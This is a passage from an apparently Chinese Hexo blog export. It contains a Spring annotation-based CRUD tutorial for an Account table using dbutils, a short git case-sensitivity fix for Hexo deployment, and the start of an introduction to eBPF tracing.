class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Account&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, money=&quot;</span> + money +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-2-业务层接口"><a href="#2-2-业务层接口" class="headerlink" title="2.2 业务层接口"></a>2.2 业务层接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的业务层接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IAccountService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询一个</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> acccountId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer acccountId)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-3-业务层实现类"><a href="#2-3-业务层实现类" class="headerlink" title="2.3 业务层实现类"></a>2.3 业务层实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.dao.IAccountDao;</span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.itheima.service.IAccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的业务层实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service(&quot;accountService&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceImpl</span> <span class="keyword">implements</span> <span class="title">IAccountService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IAccountDao accountDao;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountDao.findAllAccount();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> accountDao.findAccountById(accountId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        accountDao.saveAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        accountDao.updateAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer acccountId)</span> </span>&#123;</span><br><span class="line">        accountDao.deleteAccount(acccountId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用到了注解:</p>
<p><code>@Service</code>：一般用于业务层的注解。</p>
<p><code>@Autowired</code>：自动按照类型注入。</p>
<h3 id="2-4-dao层接口"><a href="#2-4-dao层接口" class="headerlink" title="2.4 dao层接口"></a>2.4 dao层接口</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Account;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的持久层接口</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IAccountDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询一个</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function">Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 更新</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> account</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 删除</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> acccountId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer acccountId)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="2-5-dao层实现类"><a href="#2-5-dao层实现类" class="headerlink" title="2.5 dao层实现类"></a>2.5 dao层实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.dao.IAccountDao;</span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Account;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.QueryRunner;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.dbutils.handlers.BeanListHandler;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 账户的持久层实现类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Repository(&quot;accountDao&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountDaoImpl</span> <span class="keyword">implements</span> <span class="title">IAccountDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> QueryRunner runner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Account&gt; <span class="title">findAllAccount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> runner.query(<span class="string">&quot;select * from account&quot;</span>,<span class="keyword">new</span> BeanListHandler&lt;Account&gt;(Account.class));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Account <span class="title">findAccountById</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> runner.query(<span class="string">&quot;select * from account where id = ? &quot;</span>,<span class="keyword">new</span> BeanHandler&lt;Account&gt;(Account.class),accountId);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">saveAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;insert into account(name,money)values(?,?)&quot;</span>,account.getName(),account.getMoney());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateAccount</span><span class="params">(Account account)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;update account set name=?,money=? where id=?&quot;</span>,account.getName(),account.getMoney(),account.getId());</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteAccount</span><span class="params">(Integer accountId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            runner.update(<span class="string">&quot;delete from account where id=?&quot;</span>,accountId);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用的dbutils进行数据库操作</p>
<h3 id="2-6-bean-xml"><a href="#2-6-bean-xml" class="headerlink" title="2.6 bean.xml"></a>2.6 bean.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 告知spring在创建容器时要扫描的包 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.itheima&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">context:component-scan</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置QueryRunner--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;runner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.commons.dbutils.QueryRunner&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;prototype&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--注入数据源--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;ds&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 配置数据源 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.mchange.v2.c3p0.ComboPooledDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--连接数据库的必备信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;jdbcUrl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/eesy&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>基于注解的bean.xml和基于xml的bean.xml有所不同，这里要告诉扫描的包，让spring去找注解，</p>
<h3 id="2-7-测试类"><a href="#2-7-测试类" class="headerlink" title="2.7 测试类"></a>2.7 测试类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.itheima.domain.Account;</span><br><span class="line"><span class="keyword">import</span> com.itheima.service.IAccountService;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用Junit单元测试：测试我们的配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AccountServiceTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFindAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取容易</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2.得到业务层对象</span></span><br><span class="line">        IAccountService as = ac.getBean(<span class="string">&quot;accountService&quot;</span>,IAccountService.class);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        List&lt;Account&gt; accounts = as.findAllAccount();</span><br><span class="line">        <span class="keyword">for</span>(Account account : accounts)&#123;</span><br><span class="line">            System.out.println(account);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFindOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取容易</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2.得到业务层对象</span></span><br><span class="line">        IAccountService as = ac.getBean(<span class="string">&quot;accountService&quot;</span>,IAccountService.class);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        Account account = as.findAccountById(<span class="number">1</span>);</span><br><span class="line">        System.out.println(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSave</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Account account = <span class="keyword">new</span> Account();</span><br><span class="line">        account.setName(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        account.setMoney(<span class="number">12345f</span>);</span><br><span class="line">        <span class="comment">//1.获取容易</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2.得到业务层对象</span></span><br><span class="line">        IAccountService as = ac.getBean(<span class="string">&quot;accountService&quot;</span>,IAccountService.class);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        as.saveAccount(account);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取容易</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2.得到业务层对象</span></span><br><span class="line">        IAccountService as = ac.getBean(<span class="string">&quot;accountService&quot;</span>,IAccountService.class);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        Account account = as.findAccountById(<span class="number">4</span>);</span><br><span class="line">        account.setMoney(<span class="number">23456f</span>);</span><br><span class="line">        as.updateAccount(account);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.获取容易</span></span><br><span class="line">        ApplicationContext ac = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;bean.xml&quot;</span>);</span><br><span class="line">        <span class="comment">//2.得到业务层对象</span></span><br><span class="line">        IAccountService as = ac.getBean(<span class="string">&quot;accountService&quot;</span>,IAccountService.class);</span><br><span class="line">        <span class="comment">//3.执行方法</span></span><br><span class="line">        as.deleteAccount(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看一下测试类。</p>
<p>先用spring框架加载bean.xml文件，这时候就会扫描项目获取注解，生成所有对象。获取对象，执行对应的方法。</p>
<h2 id="3-完全不用xml文件的注解"><a href="#3-完全不用xml文件的注解" class="headerlink" title="3. 完全不用xml文件的注解"></a>3. 完全不用xml文件的注解</h2><p>第二节的使用注解并没有完全脱离xml，只是在自己写的类上加的注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Import;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.PropertySource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 该类是一个配置类，它的作用和bean.xml是一样的</span></span><br><span class="line"><span class="comment"> * spring中的新注解</span></span><br><span class="line"><span class="comment"> * Configuration</span></span><br><span class="line"><span class="comment"> *     作用：指定当前类是一个配置类</span></span><br><span class="line"><span class="comment"> *     细节：当配置类作为AnnotationConfigApplicationContext对象创建的参数时，该注解可以不写。</span></span><br><span class="line"><span class="comment"> * ComponentScan</span></span><br><span class="line"><span class="comment"> *      作用：用于通过注解指定spring在创建容器时要扫描的包</span></span><br><span class="line"><span class="comment"> *      属性：</span></span><br><span class="line"><span class="comment"> *          value：它和basePackages的作用是一样的，都是用于指定创建容器时要扫描的包。</span></span><br><span class="line"><span class="comment"> *                 我们使用此注解就等同于在xml中配置了:</span></span><br><span class="line"><span class="comment"> *                      &lt;context:component-scan base-package=&quot;com.itheima&quot;&gt;&lt;/context:component-scan&gt;</span></span><br><span class="line"><span class="comment"> *  Bean</span></span><br><span class="line"><span class="comment"> *      作用：用于把当前方法的返回值作为bean对象存入spring的ioc容器中</span></span><br><span class="line"><span class="comment"> *      属性:</span></span><br><span class="line"><span class="comment"> *          name:用于指定bean的id。当不写时，默认值是当前方法的名称</span></span><br><span class="line"><span class="comment"> *      细节：</span></span><br><span class="line"><span class="comment"> *          当我们使用注解配置方法时，如果方法有参数，spring框架会去容器中查找有没有可用的bean对象。</span></span><br><span class="line"><span class="comment"> *          查找的方式和Autowired注解的作用是一样的</span></span><br><span class="line"><span class="comment"> *  Import</span></span><br><span class="line"><span class="comment"> *      作用：用于导入其他的配置类</span></span><br><span class="line"><span class="comment"> *      属性：</span></span><br><span class="line"><span class="comment"> *          value：用于指定其他配置类的字节码。</span></span><br><span class="line"><span class="comment"> *                  当我们使用Import的注解之后，有Import注解的类就父配置类，而导入的都是子配置类</span></span><br><span class="line"><span class="comment"> *  PropertySource</span></span><br><span class="line"><span class="comment"> *      作用：用于指定properties文件的位置</span></span><br><span class="line"><span class="comment"> *      属性：</span></span><br><span class="line"><span class="comment"> *          value：指定文件的名称和路径。</span></span><br><span class="line"><span class="comment"> *                  关键字：classpath，表示类路径下</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//@Configuration</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.itheima&quot;)</span></span><br><span class="line"><span class="meta">@Import(JdbcConfig.class)</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:jdbcConfig.properties&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringConfiguration</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





























]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Java框架</tag>
      </tags>
  </entry>
  <entry>
    <title>blog问题</title>
    <url>/blog%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>一些博客配置问题</p>
<span id="more"></span>



<h2 id="github更新大小写问题"><a href="#github更新大小写问题" class="headerlink" title="github更新大小写问题"></a>github更新大小写问题</h2><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">[shadowflow<span class="variable">@ShadowOS</span> hexo]<span class="variable">$ </span>cd .deploy_git/.git</span><br><span class="line">[shadowflow<span class="variable">@ShadowOS</span> hexo]<span class="variable">$ </span>vim config</span><br></pre></td></tr></table></figure>

<p>改为如下</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ignorecase</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>然后重新部署，过一会儿就ok。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>eBPF入门学习</title>
    <url>/eBPF%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>人法地，地法天，天法道，道法自然。</p>
</blockquote>
<p>Linux一直没有好用的内核态动态追踪工具，直到eBPF的出现。eBPF可以动态追踪linux事件，获取运行信息。通过分析这些信息可以用来确定是否存在攻击行为。</p>
<span id="more"></span>



<h2 id="1-eBPF"><a href="#1-eBPF" class="headerlink" title="1. eBPF"></a>1. eBPF</h2><p>BPF（Berkeley Packet Filter）是一种包过滤器，是很早就有的内核特性，最早可以追溯到1992年。由于其优良的特性，所有UNIX系统都将BPF作为网络过滤的首选技术，比如我们熟悉的Tcpdump，其底层就是依赖BPF实现的包过滤。</p>
<p>2014年，Alexei Starovoitov对BPF进行了彻底的改造，并增加了新的功能，改善了性能。经过重新设计，eBPF 演进为一个通用执行引擎，可基于此开发性能分析工具、软件定义网络等诸多场景。eBPF 最早出现在 3.18 内核中，此后原来的 BPF 就被称为经典 BPF，缩写 cBPF（classic BPF），cBPF 现在已经基本废弃。现在，Linux 内核只运行 eBPF。</p>
<p>在eBPF中，开发者可以在用户空间编写eBPF程序，并将其加载到内核空间执行，不用重新编译内核。</p>
<h3 id="1-1-eBPF原理"><a href="#1-1-eBPF原理" class="headerlink" title="1.1 eBPF原理"></a>1.1 eBPF原理</h3><p>Linux内核是一个事件驱动的系统设计，这意味着所有操作都是基于事件来描述和执行的。打开文件、CPU执行指令、接收网络数据包都是事件。eBPF可以在内核中检查这些事件的信息源，并且编写eBPF程序来处理触发该事件的代码。</p>
<p>开发者可以使用C语言或者Python等其他高级语言编写自己的eBPF程序，然后通过LLVM或者GNU、Clang等编译器，将其编译成eBPF字节码。Linux提供了一个bpf()系统调用，通过bpf()系统调用，将这段编译好的字节码传入内核空间。</p>
<p><img src="../images/pic/k8s14.jpg"> </p>
<p><img src="../images/pic/k8s17.jpg"> </p>
<p>传入内核后，先用Verifier组件进行安全测试，测试之后通过JIT编译为机器码。这样就可以在eBPF指定的附着点上执行操作逻辑了。</p>
<p>eBPF通过MAP数据结构进行数据存储和管理，eBPF将产生的数据通过指定的MAP数据类型进行存储，用户空间的应用程序作为消费者通过bpf()系统调用，从MAP数据结构中读取数据并进行存储和处理。这就是一个完整的eBPF程序的流程。</p>
<p><em>由于 eBPF 还在快速发展期，内核中的功能也日趋增强，一般推荐基于Linux 4.4+ (4.9 以上会更好) 内核的来使用 eBPF。部分 Linux Event 和 BPF 版本支持见下图：</em></p>
